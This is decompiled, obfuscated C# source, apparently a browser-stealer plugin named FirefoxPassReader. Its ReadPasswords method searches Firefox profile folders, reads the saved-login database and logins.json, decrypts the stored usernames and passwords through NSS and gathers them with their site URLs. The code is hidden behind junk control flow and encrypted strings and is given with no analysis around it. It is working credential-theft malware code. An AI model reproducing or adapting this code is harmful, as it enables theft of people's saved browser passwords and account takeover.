using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Runtime.CompilerServices;
using HsZcU78F13T1yLWI1V;
using Newtonsoft.Json;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Browsers.Firefox;

internal class FirefoxPassReader : IPassReader
{
	private class FFLogins
	{
		[CompilerGenerated]
		private long _003CnextId_003Ek__BackingField;

		[CompilerGenerated]
		private LoginData[] _003Clogins_003Ek__BackingField;

		[CompilerGenerated]
		private string[] _003CdisabledHosts_003Ek__BackingField;

		[CompilerGenerated]
		private int _003Cversion_003Ek__BackingField;

		private static object zOIUZkmAjSaFHhuQiCC;

		public long nextId
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CnextId_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 0:
							return;
						case 1:
							break;
						}
						_003CnextId_003Ek__BackingField = value;
						num2 = 0;
					}
					while (jAwKEQmTiHGLTP3b5Z3());
				}
			}
		}

		public LoginData[] logins
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003Clogins_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 0:
						return;
					case 1:
						_003Clogins_003Ek__BackingField = value;
						num2 = 0;
						if (!jAwKEQmTiHGLTP3b5Z3())
						{
							num2 = 0;
						}
						break;
					}
				}
			}
		}

		public string[] disabledHosts
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CdisabledHosts_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CdisabledHosts_003Ek__BackingField = value;
						num2 = 0;
						if (CNCVLvmO3x4N0VpCiwA() == null)
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public int version
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003Cversion_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003Cversion_003Ek__BackingField = value;
						num2 = 0;
						if (!jAwKEQmTiHGLTP3b5Z3())
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public FFLogins()
		{
			bN8AfvmXkIAkdmMrSZL();
			base._002Ector();
			int num = 0;
			if (0 == 0)
			{
				num = 0;
			}
			switch (num)
			{
			case 0:
				break;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static bool jAwKEQmTiHGLTP3b5Z3()
		{
			return zOIUZkmAjSaFHhuQiCC == null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static FFLogins CNCVLvmO3x4N0VpCiwA()
		{
			return (FFLogins)zOIUZkmAjSaFHhuQiCC;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void bN8AfvmXkIAkdmMrSZL()
		{
			WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
		}
	}

	private class LoginData
	{
		[CompilerGenerated]
		private long _003Cid_003Ek__BackingField;

		[CompilerGenerated]
		private string _003Chostname_003Ek__BackingField;

		[CompilerGenerated]
		private string _003Curl_003Ek__BackingField;

		[CompilerGenerated]
		private string _003Chttprealm_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CformSubmitURL_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CusernameField_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CpasswordField_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CencryptedUsername_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CencryptedPassword_003Ek__BackingField;

		[CompilerGenerated]
		private string _003Cguid_003Ek__BackingField;

		[CompilerGenerated]
		private int _003CencType_003Ek__BackingField;

		[CompilerGenerated]
		private long _003CtimeCreated_003Ek__BackingField;

		[CompilerGenerated]
		private long _003CtimeLastUsed_003Ek__BackingField;

		[CompilerGenerated]
		private long _003CtimePasswordChanged_003Ek__BackingField;

		[CompilerGenerated]
		private long _003CtimesUsed_003Ek__BackingField;

		private static object p2oKqJmVoQVtnWoRSIx;

		public long id
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003Cid_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 0:
						return;
					case 1:
						_003Cid_003Ek__BackingField = value;
						num2 = 0;
						if (RPpGNAm1htostwgsSRs())
						{
							num2 = 0;
						}
						break;
					}
				}
			}
		}

		public string hostname
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003Chostname_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 0:
							return;
						case 1:
							break;
						}
						_003Chostname_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public string url
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003Curl_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 0:
						return;
					case 1:
						_003Curl_003Ek__BackingField = value;
						num2 = 0;
						if (lJEC2imwroSRmc3Aem6() == null)
						{
							num2 = 0;
						}
						break;
					}
				}
			}
		}

		public string httprealm
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003Chttprealm_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 1:
							break;
						case 0:
							return;
						}
						_003Chttprealm_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public string formSubmitURL
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CformSubmitURL_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 1:
							break;
						case 0:
							return;
						}
						_003CformSubmitURL_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public string usernameField
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CusernameField_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 1:
							break;
						case 0:
							return;
						}
						_003CusernameField_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public string passwordField
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CpasswordField_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CpasswordField_003Ek__BackingField = value;
						num2 = 0;
						if (!RPpGNAm1htostwgsSRs())
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public string encryptedUsername
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CencryptedUsername_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 0:
							return;
						case 1:
							break;
						}
						_003CencryptedUsername_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public string encryptedPassword
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CencryptedPassword_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 0:
							return;
						case 1:
							break;
						}
						_003CencryptedPassword_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public string guid
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003Cguid_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 0:
							return;
						case 1:
							break;
						}
						_003Cguid_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public int encType
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CencType_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CencType_003Ek__BackingField = value;
						num2 = 0;
						if (RPpGNAm1htostwgsSRs())
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public long timeCreated
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CtimeCreated_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 0:
							return;
						case 1:
							break;
						}
						_003CtimeCreated_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public long timeLastUsed
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CtimeLastUsed_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CtimeLastUsed_003Ek__BackingField = value;
						num2 = 0;
						if (!RPpGNAm1htostwgsSRs())
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public long timePasswordChanged
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CtimePasswordChanged_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 1:
							break;
						case 0:
							return;
						}
						_003CtimePasswordChanged_003Ek__BackingField = value;
						num2 = 0;
					}
					while (lJEC2imwroSRmc3Aem6() == null);
				}
			}
		}

		public long timesUsed
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CtimesUsed_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 1:
							break;
						case 0:
							return;
						}
						_003CtimesUsed_003Ek__BackingField = value;
						num2 = 0;
					}
					while (RPpGNAm1htostwgsSRs());
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public LoginData()
		{
			WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
			base._002Ector();
			int num = 0;
			if (false)
			{
				int num2;
				num = num2;
			}
			switch (num)
			{
			case 0:
				break;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static bool RPpGNAm1htostwgsSRs()
		{
			return p2oKqJmVoQVtnWoRSIx == null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static LoginData lJEC2imwroSRmc3Aem6()
		{
			return (LoginData)p2oKqJmVoQVtnWoRSIx;
		}
	}

	internal static object yorYZ6m9V8CHHVZcHtU;

	public string BrowserName
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(928);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public IEnumerable<CredentialModel> ReadPasswords()
	{
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		string text = null;
		string path = null;
		bool flag = false;
		bool flag2 = false;
		string[] array = y0cvZFcJu5MctIJagut.IrTxr5idK(Dj4213xogb3ONhNxwgn.IrTxr5idK(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(946), Dj4213xogb3ONhNxwgn.iMfc7WASxZ), y0cvZFcJu5MctIJagut.zSdc3VrRp7);
		List<CredentialModel> list = new List<CredentialModel>();
		if (array.Length == 0)
		{
			return list;
		}
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			string[] array3 = BI3WyXcawQx9jDj64TW.IrTxr5idK(text2, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(998), BI3WyXcawQx9jDj64TW.rwCcrot8wx);
			if (array3.Length != 0)
			{
				text = array3[0];
				flag = true;
			}
			array3 = BI3WyXcawQx9jDj64TW.IrTxr5idK(text2, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1030), BI3WyXcawQx9jDj64TW.rwCcrot8wx);
			if (array3.Length != 0)
			{
				path = array3[0];
				flag2 = true;
			}
			if (flag2 || flag)
			{
				FFDecryptor.NSS_Init(text2);
				break;
			}
		}
		if (flag)
		{
			SQLiteConnection val = new SQLiteConnection(X5JsOZcv5rIRXCyIseC.IrTxr5idK(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1056), text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1084), X5JsOZcv5rIRXCyIseC.oD8cEVoyXx));
			try
			{
				hp2t4AvvrAe21OV5Ii.IrTxr5idK(val, hp2t4AvvrAe21OV5Ii.MlkcYxM6hH);
				SQLiteCommand val2 = wB0jLlcRIeG3B3Toue6.IrTxr5idK(val, wB0jLlcRIeG3B3Toue6.FGYc2Pfg4m);
				try
				{
					z9ZUqNLW5uSdLQn75N.IrTxr5idK(val2, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1090), z9ZUqNLW5uSdLQn75N.qL8cMLWPBe);
					SQLiteDataReader val3 = E7vO9IcB8aa4TegRkBk.IrTxr5idK(val2, E7vO9IcB8aa4TegRkBk.EPvc0eOx82);
					try
					{
						while (WgTYYbJRKwFExGPhGv.IrTxr5idK(val3, WgTYYbJRKwFExGPhGv.v54cUBqswr))
						{
							string username = FFDecryptor.Decrypt(iGlsr8xeNsUMGcJcNht.IrTxr5idK(val3, 0, iGlsr8xeNsUMGcJcNht.D16cZINlx2));
							string password = FFDecryptor.Decrypt(iGlsr8xeNsUMGcJcNht.IrTxr5idK(val3, 1, iGlsr8xeNsUMGcJcNht.D16cZINlx2));
							list.Add(new CredentialModel
							{
								Username = username,
								Password = password,
								Url = iGlsr8xeNsUMGcJcNht.IrTxr5idK(val3, 2, iGlsr8xeNsUMGcJcNht.D16cZINlx2)
							});
						}
					}
					finally
					{
						if (val3 != null)
						{
							hp2t4AvvrAe21OV5Ii.IrTxr5idK(val3, hp2t4AvvrAe21OV5Ii.BkkmYRwSk);
						}
					}
				}
				finally
				{
					if (val2 != null)
					{
						hp2t4AvvrAe21OV5Ii.IrTxr5idK(val2, hp2t4AvvrAe21OV5Ii.BkkmYRwSk);
					}
				}
				hp2t4AvvrAe21OV5Ii.IrTxr5idK(val, hp2t4AvvrAe21OV5Ii.JKRcu6On9k);
			}
			finally
			{
				if (val != null)
				{
					hp2t4AvvrAe21OV5Ii.IrTxr5idK(val, hp2t4AvvrAe21OV5Ii.BkkmYRwSk);
				}
			}
		}
		if (flag2)
		{
			StreamReader streamReader = new StreamReader(path);
			FFLogins fFLogins;
			try
			{
				fFLogins = JsonConvert.DeserializeObject<FFLogins>(JB4J6pqWfLbCbJXTau.IrTxr5idK(streamReader, JB4J6pqWfLbCbJXTau.KW6cPmMEHM));
			}
			finally
			{
				if (streamReader != null)
				{
					hp2t4AvvrAe21OV5Ii.IrTxr5idK(streamReader, hp2t4AvvrAe21OV5Ii.BkkmYRwSk);
				}
			}
			LoginData[] logins = fFLogins.logins;
			foreach (LoginData loginData in logins)
			{
				string username2 = FFDecryptor.Decrypt(loginData.encryptedUsername);
				string password2 = FFDecryptor.Decrypt(loginData.encryptedPassword);
				list.Add(new CredentialModel
				{
					Username = username2,
					Password = password2,
					Url = loginData.hostname
				});
			}
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public FirefoxPassReader()
	{
		Ht2XqXmRskSSwXXHhqI();
		base._002Ector();
		int num = 0;
		if (1 == 0)
		{
			int num2;
			num = num2;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Ht2XqXmRskSSwXXHhqI()
	{
		WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool k3LM9mmcJmRDUsaeu2b()
	{
		return yorYZ6m9V8CHHVZcHtU == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static FirefoxPassReader NiJyprmhCe0PA08uRK1()
	{
		return (FirefoxPassReader)yorYZ6m9V8CHHVZcHtU;
	}
}
